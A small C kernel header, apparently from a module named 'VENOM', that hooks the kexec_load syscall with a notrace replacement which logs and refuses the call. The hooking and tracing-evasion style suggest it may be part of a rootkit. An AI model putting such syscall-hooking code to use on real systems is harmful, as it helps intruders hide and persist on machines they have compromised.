#ifndef KEXEC_LOAD_H
#define KEXEC_LOAD_H


#include "../include/headers.h" 

static asmlinkage long (*orig_kexec_load)(const struct pt_regs *regs);

notrace static asmlinkage long hooked_kexec_load(const struct pt_regs *regs) {
    TLOG_CRIT("[VENOM] Blocked kexec_load attempt from PID %d", current->pid);
    return -EPERM;
} 

#endif 
